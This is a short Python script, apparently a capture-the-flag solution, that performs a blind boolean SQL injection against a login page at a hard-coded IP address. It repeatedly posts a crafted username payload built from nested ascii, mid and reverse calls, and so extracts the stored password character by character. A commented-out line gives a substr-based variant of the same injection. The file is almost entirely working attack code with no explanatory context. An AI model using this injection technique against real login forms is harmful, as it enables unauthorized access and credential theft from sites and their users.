import requests
url = 'http://123.206.87.240:8007/web2/login.php'
char = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.{}'

flag = ''

for i in range(1, 40):
    for p in range(32, 126):
        # url = base_url + u"1' and substr((select flag from flag),%d,1)='%s' --+" %(i,p)
        payload = u"admin'-(ascii(mid(REVERSE(MID((passwd)from(-%d)))from(-1)))=%d)-'" % (i, p)
        data = {
            'uname': payload,
            'passwd': '123456'
        }
        html = requests.post(url, data=data).text
        if 'username' in html:
            print(i)
            flag += chr(p)
            print(flag)
print("=================================>")

print("\n" + flag)

